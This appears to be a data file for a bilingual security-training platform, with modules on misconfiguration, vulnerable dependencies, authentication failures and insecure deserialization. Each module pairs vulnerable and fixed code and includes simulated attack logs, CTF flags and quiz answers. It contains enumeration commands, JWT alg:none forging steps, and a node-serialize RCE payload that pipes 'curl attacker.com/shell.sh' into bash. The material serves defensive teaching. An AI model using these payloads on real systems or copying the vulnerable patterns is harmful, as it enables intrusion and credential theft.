        <li>عملية تصليب متكررة لكل بيئة (Dev, QA, Prod).</li>
        <li>أزل أو لا تثبّت الميزات والمكونات والوثائق غير المستخدمة.</li>
        <li>راجع وحدّث الإعدادات كجزء من عملية إدارة التحديثات.</li>
        <li>طبّق ترويسات الأمان: CSP, HSTS, X-Frame-Options, X-Content-Type-Options.</li>
        <li>فحص الإعدادات تلقائياً في CI/CD pipelines.</li>
      </ul>
    `,
    readTime: '7 min',
    xpReward: 100,
    realWorldCases: [
      { title: 'Capital One Breach (2019)', impact: '100M customer records via misconfigured AWS WAF', cve: 'N/A' },
      { title: 'MongoDB Ransomware (2017)', impact: '27K exposed MongoDB instances wiped and ransomed', cve: 'N/A' },
      { title: 'Twitch Source Code Leak (2021)', impact: '125GB leaked via misconfigured server', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Default Credentials', description: 'admin:admin or admin:password on management panels', severity: 'Critical' },
      { name: 'Verbose Error Pages', description: 'Stack traces revealing framework, DB schema, file paths', severity: 'Medium' },
      { name: 'Open Cloud Storage', description: 'Public S3 buckets or Azure blobs with sensitive data', severity: 'High' },
      { name: 'Exposed Admin Panels', description: '/admin, /phpmyadmin, /.env accessible without auth', severity: 'High' },
      { name: 'Unnecessary HTTP Methods', description: 'PUT/DELETE enabled on endpoints that should be read-only', severity: 'Medium' }
    ],
    theory: `
      <h3>What is Security Misconfiguration?</h3>
      <p>Security misconfiguration is the most commonly seen issue. It results from insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.</p>
      <h3>Common Misconfigurations</h3>
      <ul>
        <li>Default accounts and passwords still enabled and unchanged.</li>
        <li>Error handling reveals stack traces or other overly informative error messages to users.</li>
        <li>Security features are disabled or not configured securely.</li>
        <li>The server does not send security headers or they are set to insecure values.</li>
        <li>Unnecessary ports, services, pages, accounts, or privileges are enabled.</li>
        <li>Cloud storage permissions are misconfigured (public read/write).</li>
      </ul>
      <h3>Enumeration Techniques</h3>
      <ul>
        <li>Directory brute-force: gobuster dir -u URL -w wordlist.txt</li>
        <li>Check for .env, .git, backup files: curl URL/.env</li>
        <li>Scan for default credentials with Hydra or Burp Intruder.</li>
        <li>Analyze HTTP response headers: curl -I URL</li>
        <li>Check cloud storage: aws s3 ls s3://bucket-name --no-sign-request</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>A repeatable hardening process for every environment (Dev, QA, Prod).</li>
        <li>Remove or do not install unused features, components, documentation.</li>
        <li>Review and update configurations as part of the patch management process.</li>
        <li>Implement security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options.</li>
        <li>Automated scanning of configurations in CI/CD pipelines.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE CONFIG — Verbose Errors + No Headers
// ============================================
const app = express();

// VULNERABLE: Exposes full stack trace
app.use((err, req, res, next) => {
  res.status(500).send(err.stack);
});

// VULNERABLE: No security headers
// No helmet, no CSP, no HSTS

// ============================================
// SECURE CONFIG — Hardened Express Setup
// ============================================
const helmet = require('helmet');
const app = express();

// SECURE: Security headers via helmet
app.use(helmet());
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"] }
}));

// SECURE: Generic error messages only
app.use((err, req, res, next) => {
  console.error(err); // Log internally
  res.status(500).json({ error: 'Internal server error' });
});

// SECURE: Disable X-Powered-By header
app.disable('x-powered-by');`,
    quiz: [
      { q: 'Which file should NEVER be accessible from a web server?', options: ['index.html', 'robots.txt', '.env', 'favicon.ico'], answer: 2 },
      { q: 'What HTTP header prevents clickjacking attacks?', options: ['X-XSS-Protection', 'X-Frame-Options', 'Content-Type', 'Authorization'], answer: 1 },
      { q: 'Which tool is used to brute-force hidden directories on a web server?', options: ['sqlmap', 'gobuster', 'hashcat', 'netcat'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://admin-panel.internal.io/login',
      vulnerableCode: `// Server configuration — VULNERABLE
const app = express();

// ⚠️ Default credentials in config
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'admin123';

// ⚠️ Verbose error handler
app.use((err, req, res, next) => {
  res.status(500).send(\`
    Error: \${err.message}
    Stack: \${err.stack}
    DB: mysql://root:root@localhost/prod
  \`);
});

// ⚠️ .env file accessible
app.use(express.static('.'));`,
      terminalLogs: [
        '[10:15:00] SYS: Starting enumeration on target...',
        '[10:15:01] SCAN: gobuster dir -u https://target.io -w common.txt',
        '[10:15:03] FOUND: /.env (200 OK)',
        '[10:15:04] FOUND: /admin (200 OK)',
        '[10:15:05] READ: .env → DB_PASS=SuperSecret123, JWT_SECRET=abc123',
        '[10:15:06] TEST: Trying admin:admin on /admin panel...',
        '[10:15:07] AUTH: Login successful with default credentials!'
      ],
      stages: [
        { id: 1, title: 'Enumerate', description: 'Use directory brute-forcing to find hidden files and panels', hint: 'Try gobuster or check /.env, /.git, /admin manually' },
        { id: 2, title: 'Extract Secrets', description: 'Access the exposed .env file and read credentials', hint: 'curl https://target.io/.env' },
        { id: 3, title: 'Default Creds', description: 'Try default credentials on the admin panel', hint: 'Try admin:admin, admin:password, admin:123456' },
        { id: 4, title: 'Harden', description: 'Block sensitive files, add security headers, change default creds', hint: 'Use helmet.js and deny access to .env in nginx/apache config' }
      ],
      flag: 'FLAG{M1sc0nf1g_3xp0s3d_S3cr3ts}'
    }
  },
  'm06': {
    id: 'm06',
    title: 'Vuln Components',
    icon: 'Package',
    difficulty: 'MEDIUM',
    severity: 'Variable',
    type: 'Supply Chain',
    cvss: '7.8',
    description: 'Using libraries or frameworks with known vulnerabilities.',
    objective: 'Identify a vulnerable library in use and exploit a known CVE.',
    objective_ar: 'تحديد مكتبة ضعيفة مستخدمة واستغلال CVE معروف فيها.',
    defense: 'Keep all dependencies updated and run regular security audits.',
    defense_ar: 'حافظ على تحديث جميع التبعيات وأجرِ فحوصات أمنية دورية.',
    description_ar: 'استخدام مكتبات أو أطر عمل تحتوي على ثغرات معروفة.',
    theory_ar: `
      <h3>ما هي المكونات الضعيفة؟</h3>
      <p>المكونات كالمكتبات والأطر تعمل بنفس صلاحيات التطبيق. استغلال مكوّن ضعيف يمكن أن يؤدي إلى الاستيلاء الكامل على الخادم.</p>
      <h3>لماذا هي خطيرة؟</h3>
      <ul>
        <li>لا تعرف إصدارات جميع المكونات التي تستخدمها (المباشرة والمتعدية).</li>
        <li>البرنامج ضعيف أو غير مدعوم أو قديم.</li>
        <li>لا تفحص الثغرات بانتظام.</li>
        <li>لا تصلح أو تحدّث المنصة والأطر والتبعيات في الوقت المناسب.</li>
      </ul>
      <h3>أدوات الكشف</h3>
      <ul>
        <li>npm audit — فحص تبعيات Node.js للثغرات المعروفة.</li>
        <li>OWASP Dependency-Check — فاحص تبعيات متعدد اللغات.</li>
        <li>Snyk — مراقبة مستمرة للثغرات في التبعيات.</li>
        <li>Trivy — فاحص ثغرات للحاويات وأنظمة الملفات.</li>
        <li>retire.js — كشف مكتبات JavaScript القديمة.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>أزل التبعيات والميزات والملفات غير المستخدمة.</li>
        <li>راقب باستمرار إصدارات المكونات من جانب العميل والخادم.</li>
        <li>تابع مصادر CVE وNVD للثغرات في المكونات المستخدمة.</li>
        <li>احصل على المكونات من مصادر رسمية فقط عبر روابط آمنة.</li>
        <li>راقب المكتبات غير المُصانة أو التي لا تُصدر تحديثات أمنية.</li>
      </ul>
    `,
    readTime: '8 min',
    xpReward: 140,
    realWorldCases: [
      { title: 'Log4Shell (2021)', impact: 'RCE in Apache Log4j — affected millions of systems', cve: 'CVE-2021-44228' },
      { title: 'Equifax Breach (2017)', impact: '147M records stolen via Apache Struts CVE', cve: 'CVE-2017-5638' },
      { title: 'SolarWinds (2020)', impact: 'Supply chain attack via malicious software update', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Known CVE Exploit', description: 'Exploit a published CVE in an outdated library', severity: 'Critical' },
      { name: 'Prototype Pollution', description: 'Pollute Object.prototype via vulnerable lodash/jQuery', severity: 'High' },
      { name: 'Dependency Confusion', description: 'Upload malicious package with same name as internal package', severity: 'High' },
      { name: 'Typosquatting', description: 'Install malicious package with similar name (lodahs vs lodash)', severity: 'Medium' }
    ],
    theory: `
      <h3>What are Vulnerable Components?</h3>
      <p>Components such as libraries, frameworks, and other software modules run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.</p>
      <h3>Why is it Dangerous?</h3>
      <ul>
        <li>You don't know the versions of all components you use (direct and transitive dependencies).</li>
        <li>The software is vulnerable, unsupported, or out of date.</li>
        <li>You don't scan for vulnerabilities regularly.</li>
        <li>You don't fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion.</li>
      </ul>
      <h3>Detection Tools</h3>
      <ul>
        <li>npm audit — scan Node.js dependencies for known CVEs.</li>
        <li>OWASP Dependency-Check — multi-language dependency scanner.</li>
        <li>Snyk — continuous vulnerability monitoring for dependencies.</li>
        <li>Trivy — container and filesystem vulnerability scanner.</li>
        <li>retire.js — detect outdated JavaScript libraries.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Remove unused dependencies, unnecessary features, components, files, and documentation.</li>
        <li>Continuously inventory the versions of both client-side and server-side components.</li>
        <li>Monitor sources like CVE and NVD for vulnerabilities in the components.</li>
        <li>Only obtain components from official sources over secure links.</li>
        <li>Monitor for libraries and components that are unmaintained or do not create security patches.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE — Outdated dependencies
// ============================================
// package.json
{
  "dependencies": {
    "lodash": "4.17.15",    // CVE-2021-23337 (Command Injection)
    "axios": "0.18.0",      // CVE-2019-10742 (ReDoS)
    "log4js": "6.3.0",      // Multiple CVEs
    "jquery": "1.12.4"      // CVE-2019-11358 (Prototype Pollution)
  }
}

// ============================================
// SECURE — Updated + Audited dependencies
// ============================================
{
  "dependencies": {
    "lodash": "4.17.21",    // Patched
    "axios": "1.6.0",       // Patched
    "log4js": "6.9.1",      // Patched
    "jquery": "3.7.1"       // Patched
  },
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "audit:fix": "npm audit fix"
  }
}

// Add to CI/CD pipeline:
// - name: Security Audit
//   run: npm audit --audit-level=critical`,
    quiz: [
      { q: 'Which CVE caused massive RCE via Java logging library in 2021?', options: ['CVE-2017-5638', 'CVE-2021-44228', 'CVE-2019-11358', 'CVE-2014-0160'], answer: 1 },
      { q: 'Which command scans Node.js dependencies for known vulnerabilities?', options: ['npm check', 'npm audit', 'npm scan', 'npm verify'], answer: 1 },
      { q: 'What is "dependency confusion" attack?', options: ['Using wrong package version', 'Uploading malicious package with internal package name to public registry', 'Typo in package name', 'Circular dependency'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://api.legacy-system.com/status',
      vulnerableCode: `// package.json — VULNERABLE
{
  "name": "legacy-api",
  "dependencies": {
    "lodash": "4.17.15",
    // ⚠️ CVE-2021-23337: Command Injection
    // via lodash.template() with sourceURL
    
    "jquery": "1.12.4"
    // ⚠️ CVE-2019-11358: Prototype Pollution
    // $.extend(true, {}, userInput)
  }
}

// Vulnerable usage:
const _ = require('lodash');
const tmpl = _.template(userInput); // RCE possible`,
      terminalLogs: [
        '[11:20:10] SYS: Fingerprinting application stack...',
        '[11:20:11] SCAN: Extracting package.json from /static/bundle.js',
        '[11:20:12] FOUND: lodash@4.17.15 detected',
        '[11:20:13] CVE: CVE-2021-23337 — Command Injection via template()',
        '[11:20:14] FOUND: jquery@1.12.4 detected',
        '[11:20:15] CVE: CVE-2019-11358 — Prototype Pollution',
        '[11:20:16] EXPLOIT: Injecting payload via lodash.template()...',
        '[11:20:18] SHELL: Remote code execution confirmed!'
      ],
      stages: [
        { id: 1, title: 'Fingerprint', description: 'Identify the versions of libraries used by the application', hint: 'Check /static/bundle.js or use Wappalyzer browser extension' },
        { id: 2, title: 'CVE Lookup', description: 'Search for known CVEs for the identified library versions', hint: 'Search NVD: https://nvd.nist.gov or run npm audit' },
        { id: 3, title: 'Exploit', description: 'Craft a payload exploiting the identified CVE', hint: 'For lodash CVE-2021-23337: use template() with sourceURL option' },
        { id: 4, title: 'Patch', description: 'Update all vulnerable dependencies to patched versions', hint: 'Run npm audit fix or manually update package.json' }
      ],
      flag: 'FLAG{CVE_Hunt3r_D3p3nd3ncy_Pwn3d}'
    }
  },
  'm07': {
    id: 'm07',
    title: 'Auth Failures',
    icon: 'UserCheck',
    difficulty: 'HARD',
    severity: 'High',
    type: 'Authentication',
    cvss: '8.1',
    description: 'Failures in authentication and session management.',
    objective: 'Bypass MFA or hijack an active session through weak token generation.',
    objective_ar: 'تجاوز MFA أو اختطاف جلسة نشطة عبر توليد tokens ضعيف.',
    defense: 'Implement MFA, strong session IDs, and align password policies with NIST 800-63b.',
    defense_ar: 'طبّق MFA، استخدم معرّفات جلسة قوية، وطابق سياسات كلمات المرور مع NIST 800-63b.',
    description_ar: 'إخفاقات في المصادقة وإدارة الجلسات تتيح للمهاجمين اختطاف الحسابات.',
    theory_ar: `
      <h3>ما هي إخفاقات المصادقة؟</h3>
      <p>التحقق من هوية المستخدم وإدارة الجلسات أمر بالغ الأهمية. قد تكون هناك نقاط ضعف في المصادقة إذا كان التطبيق يسمح بهجمات آلية كـ Credential Stuffing أو Brute Force.</p>
      <h3>هجمات JWT</h3>
      <ul>
        <li><strong>Algorithm None:</strong> تعيين alg إلى "none" وحذف التوقيع — الخادم يقبل token غير موقّع.</li>
        <li><strong>RS256 إلى HS256:</strong> تغيير الخوارزمية من غير متماثلة إلى متماثلة، التوقيع بالمفتاح العام.</li>
        <li><strong>Secret ضعيف:</strong> كسر أسرار JWT الضعيفة باستخدام hashcat أو jwt-cracker.</li>
        <li><strong>Kid Injection:</strong> حقن SQL أو Path Traversal في معامل "kid" في الترويسة.</li>
      </ul>
      <h3>عيوب إدارة الجلسات</h3>
      <ul>
        <li>Tokens جلسة بإنتروبيا منخفضة (قابلة للتنبؤ بناءً على Math.random()).</li>
        <li>الجلسة لا تُلغى بعد تسجيل الخروج.</li>
        <li>معرّف الجلسة مكشوف في معاملات URL.</li>
        <li>غياب علامتَي Secure وHttpOnly على كوكيز الجلسة.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>طبّق المصادقة متعددة العوامل (MFA) لمنع Credential Stuffing وBrute Force.</li>
        <li>لا تنشر أو تنشئ بيانات اعتماد افتراضية.</li>
        <li>تحقق من ضعف كلمات المرور مقابل قائمة أسوأ 10,000 كلمة مرور.</li>
        <li>استخدم معرّف جلسة عشوائي بإنتروبيا عالية يُولَّد من جانب الخادم بعد تسجيل الدخول.</li>
        <li>طابق سياسات كلمات المرور مع NIST 800-63b.</li>
      </ul>
    `,
    readTime: '11 min',
    xpReward: 160,
    realWorldCases: [
      { title: 'Uber Breach (2022)', impact: 'MFA fatigue attack — attacker spammed push notifications until accepted', cve: 'N/A' },
      { title: 'Twitter Bitcoin Scam (2020)', impact: 'Admin panel accessed via social engineering + weak session', cve: 'N/A' },
      { title: 'Dropbox Breach (2012)', impact: '68M accounts via reused credentials from LinkedIn breach', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Credential Stuffing', description: 'Use leaked username/password pairs from other breaches', severity: 'High' },
      { name: 'Brute Force', description: 'Automated password guessing with no rate limiting', severity: 'High' },
      { name: 'Session Fixation', description: 'Force a known session ID before authentication', severity: 'High' },
      { name: 'JWT Algorithm Confusion', description: 'Change alg:RS256 to alg:none to bypass signature verification', severity: 'Critical' },
      { name: 'MFA Fatigue', description: 'Spam push notifications until user accidentally approves', severity: 'Medium' }
    ],
    theory: `
      <h3>What are Authentication Failures?</h3>
      <p>Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application permits automated attacks such as credential stuffing or brute force.</p>
      <h3>JWT Attack Techniques</h3>
      <ul>
        <li><strong>Algorithm None:</strong> Set alg to "none" and remove signature — server accepts unsigned token.</li>
        <li><strong>RS256 to HS256:</strong> Change algorithm from asymmetric to symmetric, sign with public key.</li>
        <li><strong>Weak Secret:</strong> Brute-force weak JWT secrets with hashcat or jwt-cracker.</li>
        <li><strong>Kid Injection:</strong> Inject SQL or path traversal in the "kid" header parameter.</li>
      </ul>
      <h3>Session Management Flaws</h3>
      <ul>
        <li>Session tokens with low entropy (predictable Math.random() based tokens).</li>
        <li>Session not invalidated after logout.</li>
        <li>Session ID exposed in URL parameters.</li>
        <li>Missing Secure and HttpOnly flags on session cookies.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Implement multi-factor authentication to prevent credential stuffing and brute force.</li>
        <li>Do not ship or deploy with any default credentials.</li>
        <li>Implement weak password checks against top 10K worst passwords list.</li>
        <li>Use server-side session manager that generates a new random session ID with high entropy after login.</li>
        <li>Align password length, complexity, and rotation policies with NIST 800-63b.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE — Weak Session + No Rate Limit
// ============================================
app.post('/login', (req, res) => {
  const { user, pass } = req.body;
  
  if (db.checkUser(user, pass)) {
    // VULNERABLE: Predictable session token
    const token = Math.random().toString(36);
    res.cookie('session', token); // No Secure/HttpOnly
    res.json({ success: true });
  }
});

// VULNERABLE JWT — accepts alg:none
const decoded = jwt.decode(token); // No verification!

// ============================================
// SECURE — Rate Limited + Strong Session
// ============================================
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                    // 5 attempts
  message: 'Too many login attempts'
});

app.post('/login', loginLimiter, async (req, res) => {
  const { user, pass } = req.body;
  const dbUser = await db.findUser(user);
  
  if (!dbUser || !await bcrypt.compare(pass, dbUser.hash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // SECURE: Cryptographically random session ID
  const sessionId = crypto.randomBytes(32).toString('hex');
  res.cookie('session', sessionId, {
    httpOnly: true,  // No JS access
    secure: true,    // HTTPS only
    sameSite: 'strict'
  });
});

// SECURE JWT verification
const decoded = jwt.verify(token, SECRET, {
  algorithms: ['HS256'] // Explicitly whitelist algorithm
});`,
    quiz: [
      { q: 'What JWT attack sets the algorithm to "none" to bypass signature verification?', options: ['Kid Injection', 'Algorithm Confusion', "Algorithm None Attack", 'RS256 Downgrade'], answer: 2 },
      { q: 'Which cookie flag prevents JavaScript from accessing the session cookie?', options: ['Secure', 'SameSite', 'HttpOnly', 'Encrypted'], answer: 2 },
      { q: 'What attack uses leaked credentials from other breaches to try logging in?', options: ['Brute Force', 'Credential Stuffing', 'Password Spraying', 'Rainbow Table'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://auth.cloud-node.com/reset-password',
      vulnerableCode: `// Password reset — VULNERABLE
app.post('/reset-password', (req, res) => {
  const { email } = req.body;
  
  // ⚠️ VULNERABLE: Predictable token
  const token = Math.random().toString(36).substr(2);
  
  // ⚠️ No expiry, no rate limiting
  db.saveResetToken(email, token);
  sendEmail(email, \`Reset: /reset?token=\${token}\`);
});

// ⚠️ JWT with no algorithm enforcement
app.get('/profile', (req, res) => {
  const token = req.headers.authorization;
  const user = jwt.decode(token); // No verify!
  res.json(db.getUser(user.id));
});`,
      terminalLogs: [
        '[12:45:30] SYS: Intercepting password reset flow...',
        '[12:45:31] ANALYZE: Reset token = Math.random() based',
        '[12:45:32] CALC: Entropy: ~36 bits — brute-forceable',
        '[12:45:33] BRUTE: Generating 100K token candidates...',
        '[12:45:35] MATCH: Token found after 47,832 attempts',
        '[12:45:36] JWT: Attempting alg:none attack on /profile',
        '[12:45:37] FORGE: Crafted unsigned JWT with role:admin',
        '[12:45:38] ACCESS: Admin profile accessed successfully!'
      ],
      stages: [
        { id: 1, title: 'Analyze Token', description: 'Examine the password reset token entropy and predictability', hint: 'Request multiple reset tokens and compare their patterns' },
        { id: 2, title: 'Brute Force', description: 'Generate and test token candidates to hijack a reset', hint: 'Math.random() tokens have ~36 bits of entropy — feasible to brute force' },
        { id: 3, title: 'JWT Attack', description: 'Attempt the algorithm:none attack on the JWT endpoint', hint: 'Decode JWT, change alg to "none", remove signature, re-encode' },
        { id: 4, title: 'Harden', description: 'Use crypto.randomBytes for tokens and enforce JWT algorithm', hint: 'crypto.randomBytes(32) + jwt.verify with algorithms:["HS256"]' }
      ],
      flag: 'FLAG{JWT_4lg_N0n3_Byp4ss_0wn3d}'
    }
  },
  'm08': {
    id: 'm08',
    title: 'Integrity Failures',
    icon: 'GitBranch',
    difficulty: 'HARD',
    severity: 'High',
    type: 'Integrity',
    cvss: '7.5',
    description: 'Making assumptions about software and data integrity without verification.',
    objective: 'Exploit insecure deserialization to execute remote code on the server.',
    objective_ar: 'استغلال إلغاء التسلسل غير الآمن لتنفيذ كود عن بُعد على الخادم.',
    defense: 'Use JSON.parse; verify digital signatures; never deserialize untrusted data.',
    defense_ar: 'استخدم JSON.parse، تحقق من التوقيعات الرقمية، ولا تُلغِ تسلسل البيانات غير الموثوقة.',
    description_ar: 'افتراضات خاطئة حول سلامة البرامج والبيانات بدون التحقق منها.',
    theory_ar: `
      <h3>ما هي إخفاقات سلامة البرامج والبيانات؟</h3>
      <p>تركز هذه الفئة على الافتراضات المتعلقة بتحديثات البرامج والبيانات الحرجة وCI/CD pipelines بدون التحقق من سلامتها. إلغاء التسلسل غير الآمن مثال رئيسي — يمكن استغلاله لتحقيق RCE.</p>
      <h3>إلغاء التسلسل غير الآمن</h3>
      <ul>
        <li>التسلسل يحوّل الكائنات إلى صيغة قابلة للتخزين/النقل (JSON, XML, Binary).</li>
        <li>إلغاء التسلسل يعيد بناء الكائن — إذا كانت البيانات يتحكم فيها المهاجم، يمكن تشغيل Magic Methods.</li>
        <li>PHP: __wakeup() و__destruct() تُستدعى تلقائياً عند unserialize().</li>
        <li>Java: readObject() يُستغل عبر Gadget Chains (أداة ysoserial).</li>
        <li>Node.js: حزمة node-serialize تنفّذ دوال IIFE أثناء إلغاء التسلسل.</li>
      </ul>
      <h3>هجمات CI/CD Pipeline</h3>
      <ul>
        <li>خادم بناء مخترق يحقن كوداً خبيثاً في تحديثات البرامج.</li>
        <li>تبعيات خبيثة عبر Dependency Confusion أو Typosquatting.</li>
        <li>تحديثات برامج غير موقّعة تُوزَّع على المستخدمين.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>استخدم JSON.parse() بدلاً من التسلسل الأصلي للغة للبيانات غير الموثوقة.</li>
        <li>طبّق فحوصات السلامة (التوقيعات الرقمية) على الكائنات المتسلسلة.</li>
        <li>سجّل استثناءات إلغاء التسلسل وأنشئ تنبيهات عند تكرارها.</li>
        <li>عزل كود إلغاء التسلسل في بيئات منخفضة الصلاحيات.</li>
        <li>تحقق من سلامة البرامج والبيانات عبر التوقيعات الرقمية أو checksums.</li>
      </ul>
    `,
    readTime: '10 min',
    xpReward: 170,
    realWorldCases: [
      { title: 'Apache Commons (2015)', impact: 'RCE via Java deserialization in WebLogic, JBoss, Jenkins', cve: 'CVE-2015-4852' },
      { title: 'SolarWinds Orion (2020)', impact: 'Malicious update pushed to 18K organizations via compromised CI/CD', cve: 'N/A' },
      { title: 'PHP Object Injection', impact: 'RCE via unserialize() in WordPress plugins', cve: 'CVE-2019-8942' }
    ],
    attackVectors: [
      { name: 'PHP Object Injection', description: 'Craft malicious serialized PHP object to trigger magic methods', severity: 'Critical' },
      { name: 'Java Deserialization', description: 'Exploit gadget chains in Java deserialization (ysoserial)', severity: 'Critical' },
      { name: 'Node.js serialize RCE', description: 'IIFE payload in node-serialize package', severity: 'Critical' },
      { name: 'CI/CD Pipeline Poisoning', description: 'Inject malicious code into build pipeline via PR', severity: 'High' }
    ],
    theory: `
      <h3>What are Software and Data Integrity Failures?</h3>
      <p>This category focuses on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. Insecure deserialization is a prime example — applications that deserialize data from untrusted sources can be exploited to achieve RCE.</p>
      <h3>Insecure Deserialization</h3>
      <ul>
        <li>Serialization converts objects to a storable/transmittable format (JSON, XML, binary).</li>
        <li>Deserialization reconstructs the object — if the data is attacker-controlled, magic methods can be triggered.</li>
        <li>PHP: __wakeup(), __destruct() called automatically on unserialize().</li>
        <li>Java: readObject() method exploited via gadget chains (ysoserial tool).</li>
        <li>Node.js: node-serialize package executes IIFE functions during deserialization.</li>
      </ul>
      <h3>CI/CD Pipeline Attacks</h3>
      <ul>
        <li>Compromised build server injects malicious code into software updates.</li>
        <li>Malicious dependencies introduced via dependency confusion or typosquatting.</li>
        <li>Unsigned software updates distributed to end users.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Use JSON.parse() instead of language-native serialization for untrusted data.</li>
        <li>Implement integrity checks (digital signatures) for serialized objects.</li>
        <li>Log deserialization exceptions and failures — alert if they occur frequently.</li>
        <li>Isolate deserialization code in low-privilege environments.</li>
        <li>Verify software and data integrity via digital signatures or checksums.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE — Node.js Insecure Deserialization
// ============================================
const serialize = require('node-serialize');

app.post('/task', (req, res) => {
  // VULNERABLE: Deserializing untrusted user input
  const taskData = serialize.unserialize(req.body.task);
  processTask(taskData);
});

// Attacker payload:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// ============================================
// SECURE — Use JSON with schema validation
// ============================================
const Joi = require('joi');

const taskSchema = Joi.object({
  name: Joi.string().alphanum().max(50).required(),
  priority: Joi.number().integer().min(1).max(5).required(),
  data: Joi.string().max(1000)
});

app.post('/task', (req, res) => {
  // SECURE: Parse as JSON (no code execution)
  let taskData;
  try {
    taskData = JSON.parse(req.body.task);
  } catch {
    return res.status(400).json({ error: 'Invalid task format' });
  }
  
  // SECURE: Validate against strict schema
  const { error, value } = taskSchema.validate(taskData);
  if (error) return res.status(400).json({ error: error.details[0].message });
  
  processTask(value);
});`,
    quiz: [
      { q: 'Which Node.js package is known for RCE via insecure deserialization?', options: ['express-serialize', 'node-serialize', 'json-parse', 'safe-serialize'], answer: 1 },
      { q: 'What PHP magic method is automatically called when unserialize() is used?', options: ['__init__', '__construct', '__wakeup', '__serialize'], answer: 2 },
      { q: 'What tool generates Java deserialization exploit payloads using gadget chains?', options: ['sqlmap', 'ysoserial', 'metasploit', 'burpsuite'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://worker-node-1.compute.io/task',
      vulnerableCode: `// Task processor — VULNERABLE
const serialize = require('node-serialize');

app.post('/api/task', (req, res) => {
  const cookie = req.cookies.profile;
  
  // ⚠️ VULNERABLE: Deserializing cookie data
  const profile = serialize.unserialize(
    Buffer.from(cookie, 'base64').toString()
  );
  
  res.json({ user: profile.username });
});

// Attacker crafts malicious cookie:
// base64({"username":"_$$ND_FUNC$$_function(){
//   require('child_process').exec('curl attacker.com/shell.sh|bash')
// }()"})`,
      terminalLogs: [
        '[01:30:10] SYS: Analyzing cookie structure...',
        '[01:30:11] FOUND: profile cookie is base64-encoded serialized object',
        '[01:30:12] DECODE: {"username":"admin","role":"user"}',
        '[01:30:13] CRAFT: Building IIFE RCE payload...',
        '[01:30:14] ENCODE: Encoding malicious object to base64',
        '[01:30:15] SEND: Transmitting payload via profile cookie',
        '[01:30:16] EXEC: Server executed: id → uid=0(root)',
        '[01:30:17] SHELL: Reverse shell received from 10.0.5.21:4444'
      ],
      stages: [
        { id: 1, title: 'Identify', description: 'Find serialized data in cookies, request body, or headers', hint: 'Look for base64-encoded data in cookies — decode and inspect' },
        { id: 2, title: 'Craft Payload', description: 'Build a malicious serialized object with IIFE RCE payload', hint: 'Use node-serialize IIFE: {"key":"_$$ND_FUNC$$_function(){...}()"}' },
        { id: 3, title: 'Execute', description: 'Send the malicious payload and achieve code execution', hint: 'Encode payload to base64 and set as cookie value' },
        { id: 4, title: 'Patch', description: 'Replace node-serialize with JSON.parse and add schema validation', hint: 'Never use eval-based deserialization on untrusted data' }
      ],
      flag: 'FLAG{D3s3r14l1z4t10n_RC3_Pwn3d}'
    }
  },
  'm09': {
    id: 'm09',
    title: 'Logging Failures',
    icon: 'Activity',
    difficulty: 'MEDIUM',
    severity: 'Medium',
    type: 'Monitoring',
    cvss: '5.8',
    description: 'Insufficient logging and monitoring allowing attackers to persist undetected.',
    objective: 'Simulate a stealthy breach and demonstrate the absence of audit trails.',
    objective_ar: 'محاكاة اختراق خفي وإثبات غياب سجلات المراجعة في التطبيق.',
    defense: 'Implement structured logging, SIEM integration, and real-time alerting.',
    defense_ar: 'طبّق تسجيلاً منظّماً، ادمج SIEM، وأنشئ تنبيهات فورية.',
    description_ar: 'تسجيل ومراقبة غير كافيَين يتيحان للمهاجمين الاستمرار دون اكتشاف.',
    theory_ar: `
      <h3>ما هي إخفاقات التسجيل والمراقبة؟</h3>
      <p>هذه الفئة موجودة للمساعدة في اكتشاف الاختراقات النشطة والاستجابة لها. بدون تسجيل ومراقبة، لا يمكن اكتشاف الاختراقات. الإخفاق في التسجيل والكشف والمراقبة والاستجابة يحدث في أي وقت.</p>
      <h3>ما الذي يجب تسجيله؟</h3>
      <ul>
        <li>جميع أحداث المصادقة: نجاح تسجيل الدخول، الفشل، تسجيل الخروج، أحداث MFA.</li>
        <li>إخفاقات التحكم في الوصول: استجابات 403، محاولات رفع الصلاحيات.</li>
        <li>إخفاقات التحقق من المدخلات: أخطاء SQL، محاولات XSS، مدخلات كبيرة الحجم.</li>
        <li>المعاملات عالية القيمة: المدفوعات، تصدير البيانات، إجراءات المسؤول.</li>
        <li>انتهاكات تحديد معدل API والأنماط المشبوهة.</li>
      </ul>
      <h3>أفضل ممارسات تنسيق السجلات</h3>
      <ul>
